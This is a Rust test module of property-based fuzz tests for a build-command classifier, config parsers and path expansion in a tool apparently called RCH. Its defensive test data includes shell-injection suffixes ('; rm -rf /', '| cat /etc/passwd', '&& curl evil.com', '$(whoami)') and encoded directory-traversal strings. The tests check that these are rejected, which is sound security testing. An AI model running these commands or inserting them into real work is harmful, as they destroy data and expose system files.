//! Property-based tests using proptest for fuzzing and invariant verification.
//!
//! This module provides comprehensive property testing for critical RCH components:
//! - Command classification (patterns.rs)
//! - Config parsing (TOML handling)
//! - Path handling (no traversal vulnerabilities)
//!
//! All proptest runs are logged for auditing as per bead requirements.

#[cfg(test)]
mod tests {
    use crate::patterns::{
        CompilationKind, TierDecision, classify_command, classify_command_detailed,
        normalize_command,
    };
    use proptest::prelude::*;
    use std::path::PathBuf;
    use tracing::info;

    // ============================================================================
    // Classification Fuzzing Tests
    // ============================================================================

    proptest! {
        #![proptest_config(ProptestConfig::with_cases(10000))]

        /// Property: classify_command never panics on arbitrary input.
        /// This tests the robustness of the classification pipeline.
        #[test]
        fn classification_never_panics(command in ".*") {
            // Log the test case for auditing
            info!(target: "proptest::classification", "Testing command: {:?}", command);

            // Should never panic, regardless of input
            let result = classify_command(&command);

            // Invariant: confidence is always in valid range
            prop_assert!(result.confidence >= 0.0, "Confidence {} below 0", result.confidence);
            prop_assert!(result.confidence <= 1.0, "Confidence {} above 1", result.confidence);

            // Invariant: if is_compilation, must have a kind; if not, kind must be None
            if result.is_compilation {
                prop_assert!(result.kind.is_some(), "Compilation without kind");
            } else {
                prop_assert!(result.kind.is_none(), "Non-compilation with kind: {:?}", result.kind);
            }

            // Invariant: reason is never empty
            prop_assert!(!result.reason.is_empty(), "Empty reason");
        }

        /// Property: classify_command_detailed never panics and produces consistent results.
        #[test]
        fn detailed_classification_consistency(command in ".*") {
            info!(target: "proptest::classification", "Testing detailed: {:?}", command);

            // Get both simple and detailed classification
            let simple = classify_command(&command);
            let detailed = classify_command_detailed(&command);

            // Invariant: detailed classification matches simple classification
            prop_assert_eq!(
                simple.is_compilation,
                detailed.classification.is_compilation,
                "Classification mismatch for {:?}",
                command
            );
            prop_assert_eq!(simple.kind, detailed.classification.kind);
            prop_assert_eq!(simple.confidence, detailed.classification.confidence);

            // Invariant: tiers are non-empty
            prop_assert!(!detailed.tiers.is_empty(), "No tiers produced");

            // Invariant: tier numbers are sequential starting from 0
            for (i, tier) in detailed.tiers.iter().enumerate() {
                prop_assert_eq!(tier.tier as usize, i, "Non-sequential tier number");
            }
        }

        /// Property: normalize_command never panics on arbitrary input.
        #[test]
        fn normalize_never_panics(command in ".*") {
            info!(target: "proptest::normalize", "Normalizing: {:?}", command);

            let normalized = normalize_command(&command);

            // Invariant: normalized result is never longer than original (plus some buffer for edge cases)
            // Note: this might not always hold due to path expansion, so we just check it doesn't panic
            prop_assert!(normalized.len() <= command.len() + 100,
                "Normalized {:?} much longer than original {:?}",
                normalized, command);
        }

        /// Property: commands with shell metacharacters are not classified as compilation.
        #[test]
        fn shell_injection_rejected(
            prefix in "(cargo build|gcc -c|make|rustc) ",
            injection in prop::sample::select(vec![
                "; rm -rf /",
                "| cat /etc/passwd",
                "&& curl evil.com",
                "|| wget malware",
                "$(whoami)",
                "`id`",
                "> /etc/passwd",
            ])
        ) {
            let malicious = format!("{}{}", prefix, injection);
            info!(target: "proptest::security", "Testing injection: {:?}", malicious);

            let result = classify_command(&malicious);

            // Invariant: commands with shell metacharacters must not be compilation
            prop_assert!(
                !result.is_compilation,
                "Potential shell injection accepted: {} -> {:?}",
                malicious,
                result
            );
        }
    }

    // ============================================================================
    // Config Parsing Fuzzing Tests
    // ============================================================================

    proptest! {
        #![proptest_config(ProptestConfig::with_cases(10000))]

        /// Property: TOML parsing never panics on arbitrary input.
        #[test]
        fn toml_parsing_never_panics(content in ".*") {
            info!(target: "proptest::config", "Parsing TOML: {:?}", &content[..content.len().min(100)]);

            // Parse as generic TOML value - should never panic
            let result: Result<toml::Value, _> = toml::from_str(&content);

            // We don't care if it succeeds or fails, just that it doesn't panic
            match result {
                Ok(_) => info!(target: "proptest::config", "Valid TOML"),
                Err(e) => info!(target: "proptest::config", "Invalid TOML: {}", e),
            }
        }

        /// Property: Structured config parsing never panics.
        #[test]
        fn config_struct_parsing_never_panics(content in ".*") {
            use serde::Deserialize;

            // Test parsing into a config-like structure
            #[derive(Debug, Deserialize)]
            #[allow(dead_code)]
            struct TestConfig {
                settings: Option<TestSettings>,
                workers: Option<Vec<TestWorker>>,
            }

            #[derive(Debug, Deserialize)]
            #[allow(dead_code)]
            struct TestSettings {
                timeout_secs: Option<u64>,
                remote_dir: Option<String>,
            }

            #[derive(Debug, Deserialize)]
            #[allow(dead_code)]
            struct TestWorker {
                id: Option<String>,
                host: Option<String>,
                enabled: Option<bool>,
            }

            info!(target: "proptest::config", "Parsing config struct: {:?}", &content[..content.len().min(50)]);

            // Should never panic
            let _result: Result<TestConfig, _> = toml::from_str(&content);
        }

        /// Property: .env file parsing never panics.
        #[test]
        fn dotenv_parsing_never_panics(content in ".*") {
            info!(target: "proptest::dotenv", "Parsing dotenv: {:?}", &content[..content.len().min(50)]);

            // Simulate .env parsing logic from config/dotenv.rs
            let mut vars = Vec::new();
            for line in content.lines() {
                let line = line.trim();
                if line.is_empty() || line.starts_with('#') {
                    continue;
                }
                if let Some((key, value)) = line.split_once('=') {
                    let key = key.trim().to_string();
                    let value = value.trim();
                    let value = if (value.starts_with('"') && value.ends_with('"'))
                        || (value.starts_with('\'') && value.ends_with('\''))
                    {
                        if value.len() >= 2 {
                            value[1..value.len() - 1].to_string()
                        } else {
                            String::new()
                        }
                    } else {
                        value.split('#').next().unwrap_or("").trim().to_string()
                    };
                    if !key.is_empty() {
                        vars.push((key, value));
                    }
                }
            }
            // Just verifying it doesn't panic
            prop_assert!(vars.len() <= content.lines().count() + 1);
        }
    }

    // ============================================================================
    // Path Handling Security Tests
    // ============================================================================

    proptest! {
        #![proptest_config(ProptestConfig::with_cases(5000))]

        /// Property: Path normalization doesn't allow directory traversal.
        #[test]
        fn no_path_traversal(
            base in "[a-zA-Z0-9_/]{1,50}",
            traversal in prop::sample::select(vec![
                "../",
                "..\\",
                "/..",
                "\\..",
                "....//",
                "%2e%2e/",
                "%2e%2e%2f",
                "..%c0%af",
                "..%252f",
            ])
        ) {
            let malicious_path = format!("{}{}", base, traversal);
            info!(target: "proptest::path", "Testing path: {:?}", malicious_path);

            // Use std::path for canonicalization check
            let path = PathBuf::from(&malicious_path);

            // Simulate the expand_tilde function logic
            let expanded = if malicious_path.starts_with("~/") {
                if let Some(home) = dirs::home_dir() {
                    home.join(&malicious_path[2..]).display().to_string()
                } else {
                    malicious_path.clone()
                }
            } else {
                malicious_path.clone()
            };

            // Invariant: expanded path should not escape intended directory
            // (Note: this is a basic check; real security requires more careful handling)
            if expanded.contains("..") {
                info!(target: "proptest::path", "Path contains traversal: {:?}", expanded);
            }

            // Just ensure we don't panic during path operations
            let _ = path.components().count();
            let _ = path.file_name();
            let _ = path.parent();
        }

        /// Property: SSH config identity file paths are properly expanded.
        #[test]
        fn identity_file_expansion_safe(path in "[~./a-zA-Z0-9_/-]{0,100}") {
            info!(target: "proptest::path", "Expanding identity: {:?}", path);

            // Simulate expand_tilde from discovery.rs
            let expanded = if let Some(rest) = path.strip_prefix("~/") {
                if let Some(home) = dirs::home_dir() {
                    home.join(rest).display().to_string()
                } else {
                    path.clone()
                }
            } else {
                path.clone()
            };

            // Invariant: expansion should never produce paths outside home for ~/ paths
            if path.starts_with("~/") {
                if let Some(home) = dirs::home_dir() {
                    let home_str = home.display().to_string();
                    prop_assert!(
                        expanded.starts_with(&home_str) || expanded == path,
                        "Path escaped home: {} -> {}",
                        path,
                        expanded
                    );
                }
            }
        }
    }

    // ============================================================================
    // Version String Invariants
    // ============================================================================

    proptest! {
        #![proptest_config(ProptestConfig::with_cases(3000))]

        /// Property: Version string parsing follows expected patterns.
        /// Tests that version strings like "rustc 1.76.0" can be processed safely.
        #[test]
        fn version_string_parsing(
            prefix in "(rustc|bun|node|npm|gcc|clang) ",
            version in "[0-9]{1,3}\\.[0-9]{1,3}(\\.[0-9]{1,3})?(-[a-zA-Z0-9]+)?"
        ) {
            let version_str = format!("{}{}", prefix, version);
            info!(target: "proptest::version", "Testing version: {:?}", version_str);

            // Extract version number (simulate common parsing pattern)
            let parts: Vec<&str> = version_str.split_whitespace().collect();
            if parts.len() >= 2 {
                let ver = parts[1];
                // Parse major.minor.patch
                let nums: Vec<&str> = ver.split(|c| c == '.' || c == '-').collect();
                prop_assert!(!nums.is_empty(), "No version numbers found");

                // First component should be numeric
                if let Some(major) = nums.first() {
                    let _ = major.parse::<u32>(); // Should not panic
                }
            }
        }

        /// Property: Semver-like comparison transitivity.
        /// If a <= b and b <= c, then a <= c.
        #[test]
        fn version_transitivity(
            a_major in 0u32..100,
            a_minor in 0u32..100,
            a_patch in 0u32..100,
            b_major in 0u32..100,
            b_minor in 0u32..100,
            b_patch in 0u32..100,
            c_major in 0u32..100,
            c_minor in 0u32..100,
            c_patch in 0u32..100,
        ) {
            let a = (a_major, a_minor, a_patch);
            let b = (b_major, b_minor, b_patch);
            let c = (c_major, c_minor, c_patch);

            info!(target: "proptest::version", "Transitivity: {:?} vs {:?} vs {:?}", a, b, c);

            // Test transitivity using tuple comparison (which Rust guarantees)
            if a <= b && b <= c {
                prop_assert!(a <= c, "Transitivity violated: {:?} <= {:?} <= {:?} but {:?} > {:?}", a, b, c, a, c);
            }

            // Also test version string formatting doesn't panic
            let _ = format!("{}.{}.{}", a_major, a_minor, a_patch);
        }
    }

    // ============================================================================
    // Additional Robustness Tests
    // ============================================================================

    proptest! {
        #![proptest_config(ProptestConfig::with_cases(5000))]

        /// Property: Unicode handling in commands doesn't cause panics.
        #[test]
        fn unicode_command_handling(command in "\\PC*") {
            info!(target: "proptest::unicode", "Unicode command: {:?}", &command[..command.len().min(50)]);

            // Should handle any valid Unicode string
            let result = classify_command(&command);
            prop_assert!(result.confidence >= 0.0);
            prop_assert!(result.confidence <= 1.0);
        }

        /// Property: Very long commands don't cause stack overflow or excessive memory use.
        #[test]
        fn long_command_handling(
            prefix in "(cargo build|gcc|make) ",
            repeat_count in 1usize..1000,
        ) {
            let long_arg = " --flag=value".repeat(repeat_count);
            let command = format!("{}{}", prefix, long_arg);

            info!(target: "proptest::stress", "Long command length: {}", command.len());

            // Should handle without stack overflow
            let result = classify_command(&command);

            // Long commands with many flags should still classify correctly or reject cleanly
            prop_assert!(result.confidence >= 0.0);
            prop_assert!(result.confidence <= 1.0);
        }

        /// Property: Commands with null bytes are handled safely.
        #[test]
        fn null_byte_handling(prefix in "cargo build", has_null in any::<bool>()) {
            let command = if has_null {
                format!("{}\0--release", prefix)
            } else {
                format!("{} --release", prefix)
            };

            info!(target: "proptest::special", "Null byte test: has_null={}", has_null);

            // Should not panic
            let result = classify_command(&command);

            // Commands with null bytes should probably be rejected, but at minimum shouldn't panic
            prop_assert!(result.confidence >= 0.0);
        }

        /// Property: Whitespace-only commands are handled correctly.
        #[test]
        fn whitespace_handling(whitespace in "[ \\t\\n\\r]*") {
            info!(target: "proptest::whitespace", "Whitespace-only command");

            let result = classify_command(&whitespace);

            // Whitespace-only should not be compilation
            prop_assert!(!result.is_compilation, "Whitespace classified as compilation");
            prop_assert_eq!(result.confidence, 0.0);
        }
    }

    // ============================================================================
    // Non-proptest Regression Tests
    // ============================================================================

    #[test]
    fn regression_empty_string() {
        let result = classify_command("");
        assert!(!result.is_compilation);
        assert_eq!(result.confidence, 0.0);
        assert!(result.reason.contains("empty"));
    }

    #[test]
    fn regression_cargo_build_valid() {
        let result = classify_command("cargo build --release");
        assert!(result.is_compilation);
        assert_eq!(result.kind, Some(CompilationKind::CargoBuild));
        assert!(result.confidence >= 0.9);
    }

    #[test]
    fn regression_injection_semicolon() {
        let result = classify_command("cargo build; rm -rf /");
        assert!(!result.is_compilation);
        assert!(result.reason.contains("chained"));
    }

    #[test]
    fn regression_injection_pipe() {
        let result = classify_command("cargo build | tee log.txt");
        assert!(!result.is_compilation);
        assert!(result.reason.contains("piped"));
    }

    #[test]
    fn regression_injection_background() {
        let result = classify_command("cargo build &");
        assert!(!result.is_compilation);
        assert!(result.reason.contains("background"));
    }

    #[test]
    fn regression_classification_detailed_tiers() {
        let detailed = classify_command_detailed("cargo build");
        assert!(detailed.classification.is_compilation);
        assert!(!detailed.tiers.is_empty());

        // Should pass all tiers for a valid cargo build
        let final_tier = detailed.tiers.last().unwrap();
        assert_eq!(final_tier.decision, TierDecision::Pass);
    }
}
